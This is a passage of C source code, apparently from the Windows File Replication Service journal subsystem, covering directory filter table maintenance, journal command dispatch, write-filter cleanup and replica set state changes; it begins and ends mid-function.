    if (OldEntry->DParentFileID != FilterEntry->DParentFileID) {
        //
        // If parent FID is different then change child linkage.
        //
        JrnlAcquireChildLock(Replica);

        WStatus = JrnlFilterUnlinkChild (FilterTable, OldEntry, OldEntry->Replica);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT(0, "++ ERROR - Failed to put filter entry on Child List\n");
            goto REPLACE_ERROR;
        }

        //
        // Update the filter entry with the new parent and reinsert into filter.
        //
        OldEntry->DParentFileID = FilterEntry->DParentFileID;

        WStatus =  (ULONG) JrnlFilterLinkChild(FilterTable,
                                               OldEntry,
                                               OldEntry->Replica);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT(0, "++ ERROR - Failed to put filter entry on Child List\n");
            goto REPLACE_ERROR;
        }
        JrnlReleaseChildLock(Replica);

    }

    if (FilterEntry->UFileName.Length <= (OldEntry->UFileName.MaximumLength -
                                          sizeof(WCHAR))) {
        Len = FilterEntry->UFileName.Length;
    } else {
        //
        // Note: need a swap entry with row locked and ref count 2 to realloc node.
        //
        // Or just alloc a new buffer and set UFileName to point to it with
        // a test on the free side to check if not using the in-node buffer.
        // But do we really need the name?
        // It is used to build the full name path but is it really needed?
        // For now just copy the first n characters.
        //
        Len = OldEntry->UFileName.MaximumLength - sizeof(WCHAR);
    }

    CopyMemory(OldEntry->UFileName.Buffer, FilterEntry->UFileName.Buffer, Len);
    OldEntry->UFileName.Buffer[Len/2] = UNICODE_NULL;
    OldEntry->UFileName.Length = (USHORT) Len;

    FRS_JOURNAL_FILTER_PRINT(5, FilterTable, OldEntry);
    FrsFreeType(FilterEntry);
    FilterEntry = OldEntry;
    WStatus = ERROR_SUCCESS;
    goto RETURN;


REPLACE_ERROR:
    JrnlReleaseChildLock(Replica);
    FRS_JOURNAL_FILTER_PRINT(0, FilterTable, OldEntry);
    GhtDereferenceEntryByAddress(FilterTable, OldEntry, TRUE);


ERROR_RETURN:

    GHT_DUMP_TABLE(5, FilterTable);

    if (RetFilterEntry != NULL) {*RetFilterEntry = NULL;}
    return ERROR_GEN_FAILURE;

}


ULONG
JrnlDeleteDirFilterEntry(
    IN  PGENERIC_HASH_TABLE FilterTable,
    IN  PULONGLONG DFileID,
    IN  PFILTER_TABLE_ENTRY  ArgFilterEntry
    )
/*++

Routine Description:

    Delete the filter entry from the Volume Filter Table.

    The caller acquires the child list lock for the replica when doing the
    child list removal.

    The caller must decrement the refcount on the filter entry.

Arguments:

    FilterTable - ptr to the filter table struct containing the directory now.
    DFileID - ptr to FID of dir to delete.
    ArgFilterEntry - if non-null then delete this entry and skip lookup.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlDeleteDirFilterEntry:"

    ULONG GStatus, WStatus;
    PFILTER_TABLE_ENTRY  FilterEntry;


    //
    // Find the entry.
    //
    if (ArgFilterEntry == NULL) {
        GStatus = GhtLookup(FilterTable, DFileID, TRUE, &FilterEntry);
        if (GStatus != GHT_STATUS_SUCCESS) {
            DPRINT1(0, "++ WARNING: Filter entry not found in table for FID= %08x %08x\n",
                    PRINTQUAD(*DFileID));
            return ERROR_NOT_FOUND;
        }
    } else {
        FilterEntry = ArgFilterEntry;
    }

    DPRINT1(4, "++ Deleting filter entry, FID= %08x %08x\n", PRINTQUAD(FilterEntry->DFileID));

    //
    // Unlink the filter entry from the parent's child list.
    //
    // Return an error if there are children. This can happen
    // when we take a directory-create through retry. Its children
    // were added when the process queue was unblocked. This
    // function is then called when retrying the change order
    // with the idtable set to IDREC_FLAGS_NEW_FILE_IN_PROGRESS
    //
    if (!IsListEmpty(&FilterEntry->ChildHead)) {
        DPRINT(0, "++ WARN - Dir Delete but child list not empty\n");
        FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
        return ERROR_GEN_FAILURE;
    }

    if (FilterEntry->ChildEntry.Flink == NULL) {
        //
        // This may happen if we have just completed a MOVEOUT of a dir
        // subtree and a dir create remote CO is ahead of us in the process
        // queue.  When the dir create tried to add the filter table entry
        // it won't find the parent so this entry won't be on any parent list.
        // See comment in JrnlAddFilterEntry() about creation of an orphan
        // list in the future.
        //
        DPRINT(0, "++ WARN - Dir entry not on child list\n");
        FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
    } else {
        FrsRemoveEntryList(&FilterEntry->ChildEntry);
        FilterEntry->ChildEntry.Flink = NULL;
    }

    //
    // Delete the entry from the filter table.
    //
    GStatus = GhtDeleteEntryByAddress(FilterTable, FilterEntry, TRUE);
    if (GStatus != GHT_STATUS_SUCCESS) {
        DPRINT(0, "++ ERROR - GhtDeleteEntryByAddress failed.\n");
        FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
        FRS_ASSERT(!"JrnlDeleteDirFilterEntry failed.");
        return ERROR_GEN_FAILURE;
    }

    return ERROR_SUCCESS;
}


ULONG
JrnlGetPathAndLevel(
    IN  PGENERIC_HASH_TABLE  FilterTable,
    IN  PLONGLONG StartDirFileID,
    OUT PULONG    Level
)
/*++

Routine Description:

    Walk the filter table from DirFileID to the root building the directory
    path and counting the levels.

Arguments:

    FilterTable -- Ptr to the Generic hash table containing a dir filter
    StartDirFileID -- The file id of the directory to start the walk from.
    Level -- The returned nesting level of the dir. (0 means the replcia tree root)

Return Value:

    FrsError status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlGetPathAndLevel:"

    ULONGLONG   DirFileID = *StartDirFileID;
    PFILTER_TABLE_ENTRY FilterEntry;
    ULONG       FStatus = FrsErrorSuccess;
    ULONG       GStatus;

    *Level = 0;

    GStatus = GhtLookup(FilterTable, &DirFileID, TRUE, &FilterEntry);

    if (GStatus == GHT_STATUS_NOT_FOUND) {
        return FrsErrorNotFound;
    }

    while (GStatus == GHT_STATUS_SUCCESS) {
        //
        // Stop when we hit the replica tree root.
        //
        if (FilterEntry->DParentFileID == ZERO_FID) {
            GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
            break;
        }

        *Level += 1;
        if (*Level > 100000) {
            //
            // Hung.  Corrupt Filter table.
            //
            DPRINT(0, "++ ERROR: Hung in Journal entry filter lookup. Entry skipped\n");
            GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
            GHT_DUMP_TABLE(0, FilterTable);
            FRS_ASSERT(!"Hung in Journal entry filter lookup");
            return FrsErrorInternalError;
        }

        //
        // Get parent FID & Drop the reference to the filter table entry.
        // Lookup parent's filter entry.
        //
        DirFileID = FilterEntry->DParentFileID;
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);


        GStatus = GhtLookup(FilterTable, &DirFileID, TRUE, &FilterEntry);

        if (GStatus != GHT_STATUS_SUCCESS) {
            //
            // Corrupt Filter table or it could be an op on an orphaned
            // dir that will later get deleted.
            //
            DPRINT(0, "++ ERROR: Parent filter entry not found in Journal filter Table.\n");
            //GHT_DUMP_TABLE(0, FilterTable);
            return FrsErrorInternalError;
        }
    }

    return FStatus;
}


BOOL
JrnlIsChangeOrderInReplica(
    IN PCHANGE_ORDER_ENTRY  ChangeOrder,
    IN PLONGLONG            DirFileID
)
/*++

Routine Description:

    Look up the File ID for the given directory in the given journal filter
    table and if found compare the replica set pointer from the filter entry
    to the replica set pointer in the change order.  Return TRUE if match.

Arguments:

    ChangeOrder -- The change order entry assoicated with the file of interest.

    DirFileID -- The file id of the directory in which the file currently
                 resides.  This may be different than the parent FID in the
                 change order.


Return Value:

    TRUE if Pointer to Replica Struct or NULL if not found.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlIsChangeOrderInReplica:"

    PFILTER_TABLE_ENTRY FilterEntry;
    PGENERIC_HASH_TABLE FilterTable;
    ULONG               GStatus;
    PREPLICA            Replica, FilterReplica = NULL;



    Replica = ChangeOrder->NewReplica;

    if (Replica == NULL) {
        DPRINT(4, "++ WARN: No Replica in ChangeOrder\n");
        return FALSE;
    }

    if (Replica->pVme == NULL) {
        DPRINT(4, "++ WARN: No pVme in Replica\n");
        return FALSE;
    }

    FilterTable = Replica->pVme->FilterTable;
    if (FilterTable == NULL) {
        DPRINT(4, "++ WARN: No FilterTable in pVme\n");
        return FALSE;
    }


    GStatus = GhtLookup(FilterTable, DirFileID, TRUE, &FilterEntry);

    if (GStatus == GHT_STATUS_SUCCESS) {

        //
        // Get Replica ptr & Drop the reference to the filter table entry.
        //
        FilterReplica = FilterEntry->Replica;
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
    }

    return (Replica == FilterReplica);
}


ULONG
JrnlCommand(
    PCOMMAND_PACKET CmdPkt
    )
/*++

Routine Description:

    Process a command packet sent to the Journal sub-system.  External
    components interact with the Journal by building a command packet and
    submitting it to the Journal Process Queue.  The typical way journal
    processing is started is by issuing the following series of command
    packets using FrsSubmitCommand.

     <Start the journal monitor thread>

     CMD_INIT_SUBSYSTEM:         Init and start the journal for all replicas

     CMD_JOURNAL_INIT_ONE_RS:    Init service for Replica Set A
     CMD_JOURNAL_INIT_ONE_RS:    Init service for Replica Set B
              o
              o
     CMD_JOURNAL_INIT_ONE_RS:    Init service for Replica Set Z

     CMD_STOP_SUBSYSTEM:         Stop journal processing for all replica sets
                                 and terminate the journal sub-system.


Arguments:

    CmdPkt:  Command packet to process.


Return Value:

    Win32 status


--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlCommand:"

    LIST_ENTRY DeadList;
    PLIST_ENTRY Entry;
    ULONG WStatus = ERROR_SUCCESS;
    ULONG FStatus;
    PVOLUME_MONITOR_ENTRY pVme;
    FILETIME SystemTime;
    PCONFIG_TABLE_RECORD ConfigRecord;



    DPRINT1(5, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    switch (CmdPkt->Command) {


    case CMD_COMMAND_ERROR:
        DPRINT1(0, "ERROR - Invalid journal minor command: %d\n", CmdPkt->Command);
        break;

    case CMD_INIT_SUBSYSTEM:

        //
        // Initialize the journal
        //
        WStatus = JournalMonitorInit();
        DEBUG_FLUSH();
        if (!WIN_SUCCESS(WStatus)) {
            if (!FrsIsShuttingDown) {
                DPRINT_WS(0, "ERROR - Journal cannot start;", WStatus);
            }
            break;
        }

        //
        // Init the change order accept thread.
        //
        if (ChgOrdAcceptInitialize() != FrsErrorSuccess) {
            DPRINT(0, "ERROR - Journal cannot start; can't start change order thread.\n");
            WStatus = ERROR_GEN_FAILURE;
            break;
        }

        DPRINT(0, "Journal has started.\n");
        DEBUG_FLUSH();
        SetEvent(JournalEvent);

        //
        // Free up memory by reducing our working set size
        //
        SetProcessWorkingSetSize(ProcessHandle, (SIZE_T)-1, (SIZE_T)-1);
        break;

    //
    // Close all the journal VMEs, rundown the Process Queue and free
    // all the queue entries.  On return the main process loop with
    // see the queue is rundown and will terminate the thread.
    //
    case CMD_STOP_SUBSYSTEM:

        DPRINT(4, "Stopping Journal Subsystem\n");
        JrnlCloseAll();
        FrsRtlRunDownQueue(&JournalProcessQueue, &DeadList);
        FrsFreeTypeList(&DeadList);
        break;

    case CMD_PAUSE_SUBSYSTEM:
    case CMD_QUERY_INFO_SUBSYSTEM:
    case CMD_SET_CONFIG_SUBSYSTEM:
    case CMD_QUERY_CONFIG_SUBSYSTEM:
    case CMD_CANCEL_COMMAND_SUBSYSTEM:
    case CMD_READ_SUBSYSTEM:
    case CMD_WRITE_SUBSYSTEM:
        goto UNSUPPORTED_COMMAND;


    case CMD_START_SERVICE:
    case CMD_STOP_SERVICE:
    case CMD_PAUSE_SERVICE:
    case CMD_QUERY_INFO_SERVICE:
    case CMD_SET_CONFIG_SERVICE:
    case CMD_QUERY_CONFIG_SERVICE:
    case CMD_CANCEL_COMMAND_SERVICE:
    case CMD_READ_SERVICE:
    case CMD_WRITE_SERVICE:

        break;

    //
    // This command is an acknowledgement from the journal read thread that
    // journal read activity on this volume (pVme parameter) has paused.
    // Set the state to JRNL_STATE_PAUSED and signal the event in the
    // VME so any waiters can proceed.  Also mark all replica sets on this
    // volume as paused.
    //
    case CMD_JOURNAL_PAUSED:

        pVme = CmdPkt->Parameters.JournalRequest.pVme;

        FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

        SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_PAUSED);

        //
        // Save time of last replica pause. LastPause
        //
        GetSystemTimeAsFileTime(&SystemTime);
        ForEachListEntry( &pVme->ReplicaListHead, REPLICA, VolReplicaList,
            //
            // Iterator pE is of type REPLICA.
            //
            ConfigRecord = (PCONFIG_TABLE_RECORD) (pE->ConfigTable.pDataRecord);
            COPY_TIME(&ConfigRecord->LastPause, &SystemTime);
        );

        SetEvent(pVme->Event);
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        break;

    //
    // This command initializes the journal and database for a single replica
    // set.  It is intended to be used when creating or starting a replica
    // set after the initial system startup has occurred.
    // Note we don't complete the command here since we propagate it on
    // to the DB server.  In the case of failure the command is completed
    // here and status is returned in the cmd pkt ErrorStatus field.
    // The Replica->FStatus field may have more status about the failure.
    //
    case CMD_JOURNAL_INIT_ONE_RS:

        FStatus = JrnlInitOneReplicaSet(CmdPkt);
        if (FRS_SUCCESS(FStatus)) {
            return ERROR_SUCCESS;
        }

        WStatus = ERROR_GEN_FAILURE;
        break;

    //
    // Delete a journal directory filter table entry.  We do it in the journal
    // thread so we don't have to lock the table.
    //
    case CMD_JOURNAL_DELETE_DIR_FILTER_ENTRY:

        WStatus = JrnlDeleteDirFilterEntry(
            JrReplica(CmdPkt)->pVme->FilterTable,
           &JrDFileID(CmdPkt),
            NULL);

        break;

    //
    // Cleanout unneeded entries in the Journal Write Filter.
    //
    case CMD_JOURNAL_CLEAN_WRITE_FILTER:

        WStatus = JrnlCleanWriteFilter(CmdPkt);

        break;


    default:
        goto UNSUPPORTED_COMMAND;

    }  // end switch

    //
    // Retire the command packet.
    //
    FrsCompleteCommand(CmdPkt, WStatus);

    return WStatus;



UNSUPPORTED_COMMAND:
    DPRINT1(0, "ERROR - Invalid journal minor command: %d\n", CmdPkt->Command);
    return ERROR_INVALID_PARAMETER;

}



JET_ERR
JrnlInsertFilterEntry(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called It inserts a DIRTable record into the Volume filter table.

Arguments:

    ThreadCtx - Needed to access Jet.  (Not used).
    TableCtx - A ptr to a DIRTable context struct.
    Record - A ptr to a DIRTable record.
    Context - A ptr to the Replica set we are loading data for.

Return Value:

    A Jet error status.  Success means call us with the next record.
    Failure means don't call again and pass our status back to the
    caller of FrsEnumerateTable().

--*/
{
#undef DEBSUB
#define DEBSUB "JrnlInsertFilterEntry:"


    PDIRTABLE_RECORD DIRTableRec = (PDIRTABLE_RECORD) Record;
    PREPLICA Replica = (PREPLICA) Context;

    ULONG NameLen, GStatus;
    PFILTER_TABLE_ENTRY  FilterEntry;


    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    //
    // Build a filter table record big enough to hold the filename
    // and insert into the volume filter table. Note that the
    // file name field is large enough to hold the terminating
    // UNICODE_NULL because the file name field is defined as
    // a wchar array of length 1 in FILTER_TABLE_ENTRY.
    //
    NameLen = wcslen(DIRTableRec->DFileName) * sizeof(WCHAR);
    FilterEntry = FrsAllocTypeSize(FILTER_TABLE_ENTRY_TYPE, NameLen);

    //
    // Copy the data from the DIRTable record to the filter entry
    // and add a pointer to the Replica struct.
    //
    CopyMemory(FilterEntry->DFileName, DIRTableRec->DFileName, NameLen + 2);
    FilterEntry->DFileID        = DIRTableRec->DFileID;
    FilterEntry->DParentFileID  = DIRTableRec->DParentFileID;
    FilterEntry->DReplicaNumber = DIRTableRec->DReplicaNumber;
    FilterEntry->Replica        = Replica;
    FilterEntry->UFileName.Length = (USHORT)NameLen;
    FilterEntry->UFileName.Buffer[NameLen/2] = UNICODE_NULL;

    GStatus = GhtInsert(Replica->pVme->FilterTable, FilterEntry, TRUE, FALSE);
    if (GStatus != GHT_STATUS_SUCCESS) {
        DPRINT1(0, "ERROR - GhtInsert Failed: %d\n", GStatus);
        DBS_DISPLAY_RECORD_SEV(0, TableCtx, TRUE);
        FrsFreeType(FilterEntry);
        return JET_errKeyDuplicate;
    }

    return JET_errSuccess;
}


ULONG
JrnlCleanWriteFilter(
    PCOMMAND_PACKET CmdPkt
    )
/*++

Routine Description:

   Walk thru all active replica sets on this volume.  Find the minimum
   value for FSVolLastUsn.  This is the Joint journal commit point for all
   replica sets on the volume.  No replica set will start a journal
   read before this point.

   Then enumerate all entries of the Volume Write Filter table and free
   the entries whose USN is less than the Joint Journal commit point.

Arguments:

    CmdPkt:  Command packet to process.

Return Value:

    Win32 status
--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCleanWriteFilter:"

    USN JointJournalCommitUsn = MAXLONGLONG;
    LONGLONG FSVolLastUSN;

    PVOLUME_MONITOR_ENTRY pVme;
    PCONFIG_TABLE_RECORD ConfigRecord;
    ULONG TimeOut = 5*JRNL_CLEAN_WRITE_FILTER_INTERVAL;
    BOOL FoundpVme = FALSE;

    //
    // Ignore if pVme is no longer active; don't retry
    //
    pVme = JrpVme(CmdPkt);
    ForEachListEntry(&VolumeMonitorQueue, VOLUME_MONITOR_ENTRY, ListEntry,
        if (pVme == pE) {
            FoundpVme = TRUE;
            break;
        }
    );
    if (!FoundpVme) {
        return ERROR_SUCCESS;
    }

    //
    // If this journal is currently running then make a cleaning pass.
    //
    if (pVme->IoActive) {

        ForEachListEntry( &pVme->ReplicaListHead, REPLICA, VolReplicaList,
            // Iterator pE is of type PREPLICA.
            //
            // Get QuadWriteLock lock to avoid quadword tearing when FSVolLastUSN is read.
            //
            ConfigRecord = (PCONFIG_TABLE_RECORD)pE->ConfigTable.pDataRecord;

            AcquireQuadLock(&pVme->QuadWriteLock);
            FSVolLastUSN = ConfigRecord->FSVolLastUSN;
            ReleaseQuadLock(&pVme->QuadWriteLock);

            if (FSVolLastUSN < JointJournalCommitUsn) {
                JointJournalCommitUsn = FSVolLastUSN;
            }
        );


        DPRINT1(5, "WRITE FILTER TABLE CLEAN AT JointJournalCommitUsn = %08x %08x\n",
                PRINTQUAD(JointJournalCommitUsn));

        QHashEnumerateTable(pVme->FrsWriteFilter,
                            JrnlCleanWriteFilterWorker,
                            &JointJournalCommitUsn);

        TimeOut = JRNL_CLEAN_WRITE_FILTER_INTERVAL;
    }
    //
    // Resubmit the clean filter request.
    //
    JrnlSubmitCleanWriteFilter(pVme, TimeOut);
    return ERROR_SUCCESS;
}


ULONG
JrnlCleanWriteFilterWorker (
    PQHASH_TABLE Table,
    PQHASH_ENTRY BeforeNode,
    PQHASH_ENTRY TargetNode,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru QHashEnumerateTable() to process
    an entry.

Arguments:

    Table - the hash table being enumerated
    BeforeNode  -- ptr to the QhashEntry before the node of interest.
    TargetNode  -- ptr to the QhashEntry of interest.
    Context - ptr to the USN to compare against.

Return Value:

    Win32 status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlCleanWriteFilterWorker:"

    USN JointJournalCommitUsn = *(USN *)Context;


    if ( (USN)(TargetNode->QKey) < JointJournalCommitUsn) {

        DPRINT5(4, "DelWrtFilterEntry - BeforeNode: %08x, Link: %08x,"
                   " Flags: %08x, Tag: %08x %08x, Data: %08x %08x\n",
               BeforeNode, TargetNode->NextEntry, TargetNode->Flags,
               PRINTQUAD(TargetNode->QKey), PRINTQUAD(TargetNode->QData));

        //
        // Tell QHashEnumerateTable() to delete the node and continue the enum.
        //
        return FrsErrorDeleteRequested;
    }

    return FrsErrorSuccess;
}




VOID
JrnlSubmitCleanWriteFilter(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN ULONG                TimeOut
    )
/*++
Routine Description:

    Queue a work request to clean the write filter in TimeOut Seconds.

Arguments:

    pVme    -- The Vme of the write filter to clean.
    TimeOut -- The max time to wait before giving up and doing Unjoin.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlSubmitCleanWriteFilter:"

    PCOMMAND_PACKET     Cmd;

    Cmd = FrsAllocCommand(&JournalProcessQueue, CMD_JOURNAL_CLEAN_WRITE_FILTER);

    JrReplica(Cmd) = NULL;
    JrpVme(Cmd) = pVme;

    DPRINT1(5, "Submit CMD_JOURNAL_CLEAN_WRITE_FILTER %08x\n", Cmd);

    FrsDelQueueSubmit(Cmd, TimeOut);
}




BOOL
JrnlSetReplicaState(
    IN PREPLICA Replica,
    IN ULONG NewState
    )
/*++

Routine Description:

    Change the state of the Replica set and move it to the associated list.
    Note: If a replica set is in the error state it must first move back
    to the initializing state before it can leave the error state.

Arguments:

    Replica - The replica set whose state is changing.

    NewState - The new state.

Return Value:

    TRUE if state change allowed.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlSetReplicaState:"
    ULONG                 OldState;
    PVOLUME_MONITOR_ENTRY pVme;
    WCHAR                 DsPollingIntervalStr[7]; // Max interval is NTFRSAPI_MAX_INTERVAL.
    extern ULONG          DsPollingInterval;


    //
    // Lock the replica lists
    //
    EnterCriticalSection(&JrnlReplicaStateLock);

    OldState = Replica->ServiceState;

    if (OldState > JRNL_STATE_MAX) {
        DPRINT2(0, ":S: ERROR - Invalid previous Replica->ServiceState (%d) for Replica %ws\n",
                OldState, Replica->ReplicaName->Name);
        FRS_ASSERT(!"Invalid previous Replica->ServiceState");
        goto CLEANUP;
    }

    if (NewState > JRNL_STATE_MAX) {
        DPRINT2(0, ":S: ERROR - Invalid new Replica->ServiceState (%d) for Replica %ws\n",
                NewState, Replica->ReplicaName->Name);
        FRS_ASSERT(!"Invalid new Replica->ServiceState");
        goto CLEANUP;
    }

    //
    // If this replica set is in the ERROR State then the only allowed next
    // state is INITIALIZING.
    //
    if ((REPLICA_IN_ERROR_STATE(OldState) || REPLICA_STATE_NEEDS_RESTORE(OldState)) &&
        (NewState != REPLICA_STATE_INITIALIZING) &&

        !REPLICA_STATE_NEEDS_RESTORE(NewState)) {

        DPRINT4(4, ":S: ERROR: Replica (%d) %ws state change from %s to %s disallowed\n",
                Replica->ReplicaNumber,
                (Replica->ReplicaName != NULL) ? Replica->ReplicaName->Name : L"<null>",
                RSS_NAME(OldState),
                RSS_NAME(NewState));
        LeaveCriticalSection(&JrnlReplicaStateLock);
        return FALSE;
    }

    DPRINT4(4, ":S: Replica (%d) %ws state change from %s to %s\n",
            Replica->ReplicaNumber,
            (Replica->ReplicaName != NULL) ? Replica->ReplicaName->Name : L"<null>",
            RSS_NAME(OldState),
            RSS_NAME(NewState));

    //
    // if no state change, we're done.
    //
    if (OldState == NewState) {
        goto CLEANUP;
    }

    //
    // If we went from Active to Paused and are not in Journal Replay mode
    // then advance the Replica->LastUsnRecordProcessed to
    // pVme->CurrentUsnRecordDone.
    //
    pVme = Replica->pVme;
    if (pVme != NULL) {
        if ((OldState == REPLICA_STATE_ACTIVE) &&
            (NewState == REPLICA_STATE_PAUSED) &&
            !REPLICA_REPLAY_MODE(Replica, pVme)) {

            DPRINT2(4, ":U: Replica->LastUsnRecordProcessed was: %08x %08x  now: %08x %08x\n",
                    PRINTQUAD(Replica->LastUsnRecordProcessed),
                    PRINTQUAD(pVme->CurrentUsnRecordDone));

            FRS_ASSERT(pVme->CurrentUsnRecordDone >= Replica->LastUsnRecordProcessed);

            AcquireQuadLock(&pVme->QuadWriteLock);
            Replica->LastUsnRecordProcessed = pVme->CurrentUsnRecordDone;
            ReleaseQuadLock(&pVme->QuadWriteLock);
        }
    }

    //
    // update the new state.
    //
    Replica->ServiceState = NewState;

    //
    // if no list change, we're done.
    //
    if (RSS_LIST(OldState) == RSS_LIST(NewState)) {
        goto CLEANUP;
    }

    //
    // Remove from current list and add to new list.
    //
    if (RSS_LIST(OldState) != NULL) {
        FrsRtlRemoveEntryQueue(RSS_LIST(OldState), &Replica->ReplicaList);
    }
    if (RSS_LIST(NewState) != NULL) {
        FrsRtlInsertTailQueue(RSS_LIST(NewState), &Replica->ReplicaList);
    }

CLEANUP:

    if (REPLICA_IN_ERROR_STATE(NewState) &&
        !REPLICA_FSTATUS_ROOT_HAS_MOVED(Replica->FStatus)) {
        //
        // Post an error log entry if the replica is in
        // error state but not because the root has moved.
        // If the root has moved then the error log has
        // already been written when the move was detected
        // and this generic eventlog here might confuse the user.
        //
        PWCHAR  WStatusUStr, FStatusUStr;


        //
        // Post the failure in the event log.
        //
        if (Replica->Root != NULL) {
            WStatusUStr = L"";
            FStatusUStr = FrsAtoW(ErrLabelFrs(Replica->FStatus));

            EPRINT8(EVENT_FRS_REPLICA_SET_CREATE_FAIL,
                    Replica->SetName->Name,
                    ComputerDnsName,
                    Replica->MemberName->Name,
                    Replica->Root,
                    Replica->Stage,
                    JetPath,
                    WStatusUStr,
                    FStatusUStr);

            FrsFree(FStatusUStr);
        }

        //
        // Post the generic recovery steps message.
        //
        EPRINT1(EVENT_FRS_IN_ERROR_STATE, JetPath);
    } else if (NewState == REPLICA_STATE_JRNL_WRAP_ERROR) {

        //
        // Get the DsPollingInteval in minutes.
        //
        _itow(DsPollingInterval / (60 * 1000), DsPollingIntervalStr, 10);

        if(DebugInfo.EnableJrnlWrapAutoRestore) {
            EPRINT4(EVENT_FRS_REPLICA_IN_JRNL_WRAP_ERROR, Replica->SetName->Name, Replica->Root,
                    Replica->Volume, DsPollingIntervalStr);
        } else {
            EPRINT4(EVENT_FRS_REPLICA_IN_JRNL_WRAP_NO_AUTO_RESTORE, Replica->SetName->Name, Replica->Root,
                    Replica->Volume, DsPollingIntervalStr);
        }
    }

    LeaveCriticalSection(&JrnlReplicaStateLock);

    return TRUE;
}


ULONG
JrnlPrepareService1(
    PREPLICA Replica
    )
/*++

Routine Description:

    Open the NTFS volume journal and initialize a Volume Monitor Entry for it
    if this is the first replica set to use the volume.  The REPLICA struct
    is initialized with a pointer to the volume monitor entry and the file
    path to the root of the replica tree for use in file name generation.
    Init the VME Volume Sequence Number from the Replica config record,
    taking the maximum value seen so far.  This value is needed before we
    can do any ReplicaTreeLoad operations on a new replica so we can set
    the correct value in the IDTable and DIRTable entries.

    After any new replica sets are loaded JrnlPrepareService2() is
    called to init the Volume Filter Table with the directory entries for
    every replica set on the volume.


Arguments:

    Replica - The replica set we are initializing.

Return Value:

    A Win32 error status.
    Replica->FStatus has the FRS Error status return.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlPrepareService1:"

    ULONGLONG             CurrentTime;
    PCONFIG_TABLE_RECORD  ConfigRecord;
    ULONG                 WStatus;
    PVOLUME_MONITOR_ENTRY pVme;
    CHAR                  TimeStr[TIME_STRING_LENGTH];


    if (Replica == NULL) {
        return ERROR_INVALID_PARAMETER;
    }

    DPRINT1(5, ":S: JrnlPrepareService1 for %ws\n", Replica->ReplicaName->Name);


    ConfigRecord = (PCONFIG_TABLE_RECORD)Replica->ConfigTable.pDataRecord;

    //
    // Open the journal.  Return the Volume Monitor Entry and save it in
    // the Replica struct.
    //

    WStatus = JrnlOpen(Replica, &pVme, ConfigRecord);

    if (!WIN_SUCCESS(WStatus) || (pVme == NULL)) {
        //
        // Replica->FStatus has the FRS Error status return.
        //
        DPRINT_WS(0, "Error from JrnlOpen", WStatus);
        return WStatus;
    }

    //
    // Set the journal recovery range end point for this replica set.
    //
    Replica->JrnlRecoveryEnd = pVme->JrnlRecoveryEnd;

    //
    // Start the Volume sequence number from the highest value any replica set
    // has used up to now.  The FrsVsn is saved in a replica config record
    // every time VSN_SAVE_INTERVAL VSN's have been handed out.  If we crashed
    // we could be low by at most VSN_SAVE_INTERVAL VSN's assuming the update
    // request completed.  At startup we add VSN_RESTART_INCREMENT to the
    // FrsVsn to ensure we don't use the same VSN twice.  Then update the
    // config record so if we start handing out VSNs and crash we don't reuse
    // them.  Can't do update here since this Replica struct is not on the
    // VolReplicaList yet.
    //
    // The above solution does not work in the case where the database is
    // lost or restored from backup.  In this case other members of the replcia
    // set could have VSNs for files that we originated which are larger than
    // the current VSN value we might now be using.  This causes two problems:
    // 1.  It fouls up dampening checks when we send out local COs with
    //     VSNs that are too small in comparison to what we have sent out in
    //     the past resulting in dropped COs, and
    // 2.  When we VVJoin with our inbound partners and start receiving change
    //     orders that were originated from us in the past, they could arrive
    //     with VSNs that are larger than what we are now using.  When these
    //     "VVJoin Change Orders" to thru VV retire our MasterVV entry in the
    //     VVretire version vector is advanced to this larger value.  This
    //     will cause subsequent locally generated COs to be marked out of order
    //     since their VSN is now smaller than the value in the MasterVV entry.
    //     This will prevent downsream dampening problems but it could allow
    //     a local dir create / child file create to be reordered downstream
    //     (since both are marked out of order) and cause the child create to
    //     fail if the parent create hasn't occured yet.
    //
    // To deal with the above nonsense we will now use a GMT time value as
    // our initial VSN.  We will not join with a partner whose time is
    // off by +/- MaxPartnerClockSkew.  So if we start the VSN at
    // GMT + 2*MaxPartnerClockSkew then even if the last CO we originated, before
    // we lost the database, occurred at GMT+MaxPartnerClockSkew and now at
    // restart our current time has moved back to GMT-MaxPartnerClockSkew then
    // we will still join with our partner and our new starting VSN is:
    // (GMT-MaxPartnerClockSkew) + 2*MaxPartnerClockSkew = GMT+MaxPartnerClockSkew
    //
    // This is as large as the last VSN we could have generated if the time
    // between the last CO generated (the crash) and the time at recovery
    // was zero.
    //

    GetSystemTimeAsFileTime((PFILETIME)&CurrentTime);

    LOCK_VME(pVme);
    if (CurrentTime < ConfigRecord->FrsVsn) {
        //
        // Note: This may not be an error situation since on every restart
        // of the service we advance time by 2*MaxPartnerClockSkew to
        // ensure monotonicity (see above) so any time we shutdown the
